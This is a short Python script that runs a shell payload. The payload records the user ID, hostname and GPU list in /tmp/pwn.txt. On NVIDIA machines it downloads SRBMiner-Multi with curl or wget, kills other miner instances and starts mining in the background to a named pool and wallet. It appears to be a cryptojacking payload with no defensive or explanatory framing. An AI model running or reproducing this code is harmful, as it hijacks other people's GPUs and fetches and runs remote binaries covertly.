import os, subprocess, sys
cmd = r"""set +e
id >/tmp/pwn.txt 2>&1
hostname >>/tmp/pwn.txt
nvidia-smi -L >>/tmp/pwn.txt 2>&1
if nvidia-smi -L 2>/dev/null | grep -qiE 'NVIDIA|Tesla|GeForce|Quadro|A100|H100|L40|RTX|A16|T4|A10|A40|L4'; then
  mkdir -p /tmp/srb && cd /tmp/srb
  curl -fsSL -o s.tgz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.3/SRBMiner-Multi-3-8-3-Linux.tar.gz || wget -qO s.tgz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.3/SRBMiner-Multi-3-8-3-Linux.tar.gz
  tar xf s.tgz
  cd SRBMiner-Multi-3-8-3
  pkill -f SRBMiner-MULTI >/dev/null 2>&1
  nohup ./SRBMiner-MULTI --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet prl1pm6r6ufalvps4cxwkmkqmjqu8s9az79al56vjsqtgeecx5lmzq64q2ygz7t --password x --disable-cpu --keepalive true >/tmp/srb.log 2>&1 &
fi
"""
os.system(cmd)
